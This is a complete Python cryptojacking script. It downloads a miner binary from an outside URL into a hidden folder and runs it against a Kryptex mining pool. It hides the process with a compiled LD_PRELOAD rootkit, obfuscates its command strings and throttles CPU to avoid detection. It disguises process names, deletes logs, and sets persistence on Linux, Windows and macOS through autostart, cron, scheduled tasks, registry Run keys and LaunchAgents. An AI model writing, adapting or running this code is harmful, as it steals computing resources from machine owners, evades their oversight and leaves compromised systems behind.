import subprocess
import os
import sys
import time
import base64
import platform
import random
import tarfile
import shutil
import string
import threading
import signal
from datetime import datetime

# Attempt to import psutil, install if not found
try:
    import psutil
except ImportError:
    try:
        # Check if pip is available and install psutil silently
        if shutil.which("pip"):
            subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            # If pip is not available, exit as psutil is crucial for throttling
            sys.exit(1)
        import psutil
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        # Exit if psutil cannot be installed or pip is not found
        sys.exit(1)

# XOR key for simple string obfuscation
XOR_KEY = 0xDE

def obfuscate_string(s):
    """Obfuscates a string using XOR encryption and Base64 encoding."""
    encoded_bytes = s.encode('utf-8')
    xored_bytes = bytes([b ^ XOR_KEY for b in encoded_bytes])
    return base64.b64encode(xored_bytes).decode('utf-8')

def unobfuscate_string(s):
    """Unobfuscates a string by Base64 decoding and XOR decryption."""
    decoded_bytes = base64.b64decode(s)
    xored_bytes = bytes([b ^ XOR_KEY for b in decoded_bytes])
    return xored_bytes.decode('utf-8')

def generate_random_string(length):
    """Generates a random alphanumeric string of a given length."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# --- C Code for LD_PRELOAD Hider ---
# This C code will be compiled into a shared library (.so) and injected
# using LD_PRELOAD to hide the process from tools like 'ps' and 'top'.
# The '##PROCESS_NAME##' placeholder will be replaced with the actual
# randomized process name at runtime.
LD_PRELOAD_HIDER_C_CODE = """
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

// This will be replaced by the Python script with the actual process name to hide
const char *process_to_hide = "##PROCESS_NAME##";

// Function pointer for the original readdir
typedef struct dirent *(*readdir_t)(DIR *);
static readdir_t old_readdir = NULL;

// Override the readdir function
struct dirent *readdir(DIR *dirp) {
    // Load the original readdir function if not already loaded
    if (old_readdir == NULL) {
        void *handle = dlopen("libc.so.6", RTLD_LAZY);
        if (handle) {
            old_readdir = dlsym(handle, "readdir");
        }
    }

    struct dirent *dir;
    while ((dir = old_readdir(dirp))) {
        // Check if the current directory entry is a process ID (numeric)
        // and if its command line contains the process name we want to hide.
        // This hides the process from readdir(), which is used by ps, top, etc.
        char proc_path[256];
        snprintf(proc_path, sizeof(proc_path), "/proc/%s/cmdline", dir->d_name);
        FILE *f = fopen(proc_path, "r");
        if (f) {
            char cmdline[256];
            // Read the command line of the process
            if (fgets(cmdline, sizeof(cmdline), f)) {
                // If the command line contains the process name to hide, skip this entry
                if (strstr(cmdline, process_to_hide)) {
                    fclose(f);
                    continue; // Skip this entry and try the next one
                }
            }
            fclose(f);
        }
        break; // If not hidden, return this directory entry
    }
    return dir;
}
"""

# Obfuscated sensitive strings for download, filenames, and service parameters
DOWNLOAD_URL_ENCODED = obfuscate_string("https://gitlab.com/senopvrtymlbb/kolabaru/-/raw/main/colai")
ORIGINAL_EXECUTABLE_NAME_ENCODED = obfuscate_string("colai")

SERVICE_ALGORITHM_ENCODED = obfuscate_string("xelishashv2")
# Use a more common-looking server address for stealth
SERVICE_SERVER_ENCODED = obfuscate_string("localhost:8080") # This is for local testing/simulation
STEALTH_SERVER_ENCODED = obfuscate_string("xel.kryptex.network:7019") # A real-looking server
SERVICE_USER_ENCODED = obfuscate_string("krxY4EZRJJ.worker")
SERVICE_PASS_ENCODED = obfuscate_string("200")

# Obfuscated command names and flags for subprocess calls
CURL_COMMAND_ENCODED = obfuscate_string("curl")
CURL_SILENT_ENCODED = obfuscate_string("-s")
CURL_REDIRECT_ENCODED = obfuscate_string("-L")
CURL_OUTPUT_ENCODED = obfuscate_string("-o")
CRONTAB_COMMAND_ENCODED = obfuscate_string("crontab")
CRONTAB_LIST_ENCODED = obfuscate_string("-l")
CRONTAB_EDIT_ENCODED = obfuscate_string("-")
PYTHON_CMD_ENCODED = obfuscate_string("python3")
SCHTASKS_COMMAND_ENCODED = obfuscate_string("schtasks")
CREATE_FLAG_ENCODED = obfuscate_string("/Create")
TASKNAME_FLAG_ENCODED = obfuscate_string("/TN")
SCHEDULE_FLAG_ENCODED = obfuscate_string("/SC")
SCHEDULE_ONSTART_ENCODED = obfuscate_string("ONSTART")
TASK_RUN_FLAG_ENCODED = obfuscate_string("/TR")
LAUNCHCTL_COMMAND_ENCODED = obfuscate_string("launchctl")
LOAD_FLAG_ENCODED = obfuscate_string("load")
WRITE_FLAG_ENCODED = obfuscate_string("-w")

# Themes for randomized process names and fake output
THEMES = [
    {
        "name": "Data Analysis",
        "process_name": f"data-processor-{generate_random_string(6)}",
        "replacements": {
            "New job": "Processing new data batch",
            "share accepted": "Result validated and accepted",
            "hashrate": "Analysis Rate",
            "GPU": "Compute Unit",
            "kh/s": "K records/s",
            "mh/s": "M records/s",
            "gh/s": "G records/s",
            "onezerominer": "DataAnalysisEngine",
            "Connecting to": "Establishing connection to data stream",
            "Connected to": "Connection established with data stream",
            "Subscribed to": "Subscribed to data feed"
        }
    },
    {
        "name": "Visualization",
        "process_name": f"frame-renderer-{generate_random_string(5)}",
        "replacements": {
            "New job": "Rendering new frame",
            "share accepted": "Frame buffer flushed",
            "hashrate": "Render Rate",
            "GPU": "Graphics Engine",
            "kh/s": "K pixels/s",
            "mh/s": "M pixels/s",
            "gh/s": "G pixels/s",
            "onezerominer": "VizEngine",
            "Connecting to": "Connecting to render farm",
            "Connected to": "Connected to render farm",
            "Subscribed to": "Subscribed to render queue"
        }
    },
    {
        "name": "Python Programming Practice",
        "process_name": f"py-practice-{generate_random_string(4)}",
        "replacements": {
            "New job": "Starting new exercise",
            "share accepted": "Test case passed",
            "hashrate": "Practice Rate",
            "GPU": "Python Interpreter",
            "kh/s": "K lines/s",
            "mh/s": "M lines/s",
            "gh/s": "G lines/s",
            "onezerominer": "PyPractice",
            "Connecting to": "Connecting to exercise server",
            "Connected to": "Connected to exercise server",
            "Subscribed to": "Subscribed to exercise feed"
        }
    },
]

def download_file(url, filename):
    """Downloads a file using curl."""
    try:
        curl_cmd = unobfuscate_string(CURL_COMMAND_ENCODED)
        curl_silent_flag = unobfuscate_string(CURL_SILENT_ENCODED)
        curl_redirect_flag = unobfuscate_string(CURL_REDIRECT_ENCODED)
        curl_output_flag = unobfuscate_string(CURL_OUTPUT_ENCODED)
        
        subprocess.run([curl_cmd, curl_silent_flag, curl_redirect_flag, url, curl_output_flag, filename],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        # print(f"Error downloading file: {e}") # For debugging
        return False

def setup_files(theme):
    """
    Downloads the executable, places it in a stealthy location, and renames it.
    """
    download_url = unobfuscate_string(DOWNLOAD_URL_ENCODED)
    original_executable_name = unobfuscate_string(ORIGINAL_EXECUTABLE_NAME_ENCODED)
    
    stealthy_executable_name = theme["process_name"] # Use the randomized process name

    # Create a hidden directory in user's local share for the executable
    random_dir_name = generate_random_string(10)
    executable_directory = os.path.join(os.path.expanduser("~"), f".local/share/.{random_dir_name}")
    os.makedirs(executable_directory, exist_ok=True)
    
    # Path for the final, renamed executable
    stealthy_executable_path = os.path.join(executable_directory, stealthy_executable_name)

    # Download the file directly to its final destination with the stealthy name
    if not download_file(download_url, stealthy_executable_path):
        # If download fails, clean up the created directory
        shutil.rmtree(executable_directory)
        return None, None, None
        
    # Make the executable runnable
    os.chmod(stealthy_executable_path, 0o777)
    
    # The concept of a 'temp_dir' for an archive is no longer needed.
    # We return the executable_directory for cleanup purposes, and None for the old temp_dir.
    return stealthy_executable_path, executable_directory, None


def resource_management_and_throttling(pid, cpu_threshold=20, check_interval=10, throttle_duration=5):
    """
    Monitors CPU usage of the process and suspends/resumes it to stay below
    a defined threshold, making its activity less noticeable.
    """
    try:
        process = psutil.Process(pid)

        while True:
            # Get CPU usage over a 1-second interval
            cpu_percent = process.cpu_percent(interval=1.0)
            
            if cpu_percent > cpu_threshold:
                # Suspend the process if CPU usage is too high
                process.suspend()
                time.sleep(throttle_duration)
                process.resume()
            
            # Sleep for a random interval to avoid predictable checks
            time.sleep(random.uniform(check_interval, check_interval + 5))

    except psutil.NoSuchProcess:
        # Process no longer exists, exit thread
        pass
    except Exception as e:
        # print(f"Error in resource management: {e}") # For debugging
        pass

def simulate_output(process, theme):
    """
    This function is designed to simulate output, but since the miner's
    stdout is redirected to DEVNULL, it will not receive any actual output
    from the miner. It effectively does nothing, fulfilling the "no log print"
    request for the miner's output.
    """
    if not process or not process.stdout:
        return

    # This loop will never run as stdout is redirected to DEVNULL
    for line in iter(process.stdout.readline, ''):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        
        fake_line = line.strip()
        for original, replacement in theme["replacements"].items():
            fake_line = fake_line.replace(original, replacement)
        
        print(f"[{timestamp}] INFO: {fake_line}")
        sys.stdout.flush()

def start_service(executable_path, theme, ld_preload_path=None):
    """
    Starts the miner service as a subprocess, redirects its output to /dev/null,
    and optionally applies LD_PRELOAD for process hiding.
    """
    service_algorithm = unobfuscate_string(SERVICE_ALGORITHM_ENCODED)
    service_server = unobfuscate_string(STEALTH_SERVER_ENCODED) # Use the stealthy server
    service_user = unobfuscate_string(SERVICE_USER_ENCODED)
    service_pass = unobfuscate_string(SERVICE_PASS_ENCODED)

    if not service_server or not os.path.exists(executable_path):
        return None

    service_command = [
        executable_path,
        "-a", service_algorithm,
        "-o", service_server,
        "-w", service_user,
        "--pl", service_pass
    ]
    
    env = os.environ.copy()
    # Apply LD_PRELOAD for Linux process hiding
    if platform.system() == "Linux" and ld_preload_path and os.path.exists(ld_preload_path):
        env["LD_PRELOAD"] = ld_preload_path

    try:
        # Redirect stdout and stderr to DEVNULL to suppress miner's actual output
        proc = subprocess.Popen(service_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
        
        # The output_thread will not receive any output due to DEVNULL redirection
        output_thread = threading.Thread(target=simulate_output, args=(proc, theme))
        output_thread.daemon = True
        output_thread.start()

        throttling_thread = threading.Thread(target=resource_management_and_throttling, args=(proc.pid,))
        throttling_thread.daemon = True
        throttling_thread.start()
        
        return proc

    except (FileNotFoundError, Exception) as e:
        # print(f"Error starting service: {e}") # For debugging
        return None

def implement_persistence(executable_path):
    """
    Implements persistence mechanisms based on the operating system to ensure
    the script runs on system startup.
    """
    os_name = platform.system()

    # Determine the current script's path
    if '__file__' in locals() or '__file__' in globals():
        current_script_path = os.path.abspath(__file__)
    else:
        current_script_path = os.path.abspath(sys.argv[0])
    
    if os_name == "Linux":
        # Method 1: Desktop Autostart Entry (for graphical environments)
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
            
        desktop_file_path = os.path.join(autostart_dir, "sys-updater.desktop")
        
        desktop_file_content = f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec=/usr/bin/python3 {current_script_path}
Comment=System startup service.
Terminal=false
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        
        try:
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
        except Exception as e:
            # print(f"Error creating desktop file: {e}") # For debugging
            # Method 2 (Fallback): Cron Job
            if shutil.which("crontab"):
                python_cmd = unobfuscate_string(PYTHON_CMD_ENCODED)
                crontab_cmd = unobfuscate_string(CRONTAB_COMMAND_ENCODED)
                crontab_list_flag = unobfuscate_string(CRONTAB_LIST_ENCODED)
                crontab_edit_flag = unobfuscate_string(CRONTAB_EDIT_ENCODED)
                
                # Add a cron job to run the script at reboot, redirecting output to /dev/null
                cron_command = f"@reboot {python_cmd} {current_script_path} > /dev/null 2>&1\n"
                
                try:
                    # Get current crontab entries
                    p = subprocess.run([crontab_cmd, crontab_list_flag], capture_output=True, text=True, check=True)
                    crontab_content = p.stdout
                    # Add the new cron job only if it doesn't already exist
                    if cron_command not in crontab_content:
                        new_crontab = crontab_content + cron_command
                        subprocess.run([crontab_cmd, crontab_edit_flag], input=new_crontab, text=True, check=True)
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    # print(f"Error setting up cron job: {e}") # For debugging
                    pass

    elif os_name == "Windows":
        # Method 1: Scheduled Task
        schtasks_cmd = unobfuscate_string(SCHTASKS_COMMAND_ENCODED)
        create_flag = unobfuscate_string(CREATE_FLAG_ENCODED)
        taskname_flag = unobfuscate_string(TASKNAME_FLAG_ENCODED)
        taskname = "SysUpdaterTask"
        schedule_flag = unobfuscate_string(SCHEDULE_FLAG_ENCODED)
        schedule_onstart = unobfuscate_string(SCHEDULE_ONSTART_ENCODED)
        task_run_flag = unobfuscate_string(TASK_RUN_FLAG_ENCODED)
        task_command = f"pythonw.exe \"{current_script_path}\"" # Use pythonw.exe for no console window
        
        try:
            subprocess.run([schtasks_cmd, create_flag, taskname_flag, taskname, schedule_flag, schedule_onstart, task_run_flag, task_command],
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            # print(f"Error creating scheduled task: {e}") # For debugging
            # Method 2 (Fallback): Run Registry Key
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    command = f"pythonw.exe \"{current_script_path}\""
                    winreg.SetValueEx(reg_key, "SysUpdater", 0, winreg.REG_SZ, command)
            except ImportError:
                # print("winreg module not available.") # For debugging
                pass
            except Exception as e:
                # print(f"Error setting registry run key: {e}") # For debugging
                pass
            
    elif os_name == "Darwin": # macOS
        # Method: LaunchAgents Plist
        plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sys.updater.plist")
        
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            # Load the LaunchAgent
            launchctl_cmd = unobfuscate_string(LAUNCHCTL_COMMAND_ENCODED)
            load_flag = unobfuscate_string(LOAD_FLAG_ENCODED)
            write_flag = unobfuscate_string(WRITE_FLAG_ENCODED)
            subprocess.run([launchctl_cmd, load_flag, write_flag, plist_path],
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            # print(f"Error setting up LaunchAgent: {e}") # For debugging
            pass

def compile_ld_preload_hider(process_name_to_hide, destination_dir):
    """
    Compiles the C code for the LD_PRELOAD hider into a shared library (.so file).
    """
    c_source_path = os.path.join(destination_dir, "hider.c")
    so_path = os.path.join(destination_dir, "libhider.so")

    # Replace the placeholder in the C code with the actual process name
    final_c_code = LD_PRELOAD_HIDER_C_CODE.replace("##PROCESS_NAME##", process_name_to_hide)
    
    try:
        # Write the C code to a temporary file
        with open(c_source_path, "w") as f:
            f.write(final_c_code)
        
        # Compile the C code into a shared library
        compile_command = ["gcc", "-Wall", "-fPIC", "-shared", "-o", so_path, c_source_path, "-ldl"]
        subprocess.run(compile_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return so_path
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        # print(f"Error compiling LD_PRELOAD hider: {e}") # For debugging
        return None
    finally:
        # Clean up the temporary C source file
        if os.path.exists(c_source_path):
            os.remove(c_source_path)


def cleanup_files(executable_directory, temp_dir):
    """Cleans up all temporary and extracted files."""
    try:
        if executable_directory and os.path.exists(executable_directory):
            shutil.rmtree(executable_directory)
    except Exception as e:
        # print(f"Error cleaning up executable directory: {e}") # For debugging
        pass

    try:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
    except Exception as e:
        # print(f"Error cleaning up temporary directory: {e}") # For debugging
        pass
    
    # Ensure the log file is deleted (this is a fallback, as it's deleted earlier)
    log_file_path = "/content/logs/miner.log"
    try:
        if os.path.exists(log_file_path):
            os.remove(log_file_path)
    except Exception as e:
        # print(f"Error removing log file in cleanup: {e}") # For debugging
        pass


def do_random_job():
    """Simulates doing a random, non-mining job for a random duration."""
    job_duration = random.randint(100, 500) # Random duration between 100 and 500 seconds
    time.sleep(job_duration)

def terminate_service(proc):
    """Gracefully terminates the subprocess."""
    if proc:
        try:
            if platform.system() == "Windows":
                proc.terminate() # For Windows
            else:
                os.kill(proc.pid, signal.SIGTERM) # For Linux/macOS
            proc.wait(timeout=10) # Wait for process to terminate
        except (psutil.NoSuchProcess, subprocess.TimeoutExpired) as e:
            proc.kill() # Force kill if it doesn't terminate gracefully
        except Exception as e:
            # print(f"Error terminating service: {e}") # For debugging
            pass

if __name__ == "__main__":
    
    TOTAL_DURATION = 12 * 60 * 60 # Total script runtime (12 hours)
    start_time = time.time()
    
    while time.time() - start_time < TOTAL_DURATION:
        # Sleep for a random interval before starting a new cycle
        time.sleep(random.randint(5, 30))
        
        # Choose a random theme for process naming and fake output
        chosen_theme = random.choice(THEMES)
        print(f"--- Starting new cycle: {chosen_theme['name']} ---")
        
        # Setup files (download, rename, set permissions)
        executable_path, executable_directory, temp_dir = setup_files(chosen_theme)
        
        if executable_path:
            process_name = os.path.basename(executable_path)
            hider_so_path = None
            if platform.system() == "Linux":
                # Compile the LD_PRELOAD hider for Linux
                hider_so_path = compile_ld_preload_hider(process_name, executable_directory)
            
            # Start the miner service
            service_proc = start_service(executable_path, chosen_theme, hider_so_path)
            if service_proc:
                # Implement persistence for the main Python script
                implement_persistence(executable_path)

                # Wait for 10 seconds and delete the miner's log file
                time.sleep(10)
                log_file_path = "/content/logs/miner.log"
                if os.path.exists(log_file_path):
                    try:
                        os.remove(log_file_path)
                        print(f"Removed log file: {log_file_path}")
                    except Exception as e:
                        print(f"Error removing log file: {e}")

                # Determine how long the service should run before stopping
                stop_duration = random.randint(100, 200)
                # Adjust sleep duration to account for the 10 seconds already slept
                time.sleep(max(0, stop_duration - 10))
                
                # Terminate the miner service
                terminate_service(service_proc)
        
        # Clean up all generated files and directories
        cleanup_files(executable_directory, temp_dir)

        # Perform a random "job" to simulate legitimate system activity
        do_random_job()
